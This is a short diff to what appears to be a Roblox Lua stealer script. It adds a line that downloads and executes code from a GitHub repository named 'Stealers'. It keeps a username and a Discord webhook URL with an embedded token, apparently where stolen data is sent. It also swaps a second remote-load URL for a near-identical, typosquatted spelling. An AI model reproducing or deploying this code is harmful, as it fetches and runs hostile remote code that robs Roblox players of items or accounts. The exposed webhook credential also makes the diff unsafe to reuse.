@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Stealers/roblox/Gui/Zap", true))()
+
 Username = "kely5171"
 Webhook = "https://discord.com/api/webhooks/1287647760266301490/NkIN3h-dIPWEQQHDbmKLtpNu9oj1Nkl94IFkedljEetqWV_xFnVSLKYQXAsNuPb2Gi0M"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/bf.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dosiobodydoedy/x/main/bf.lua", true))()
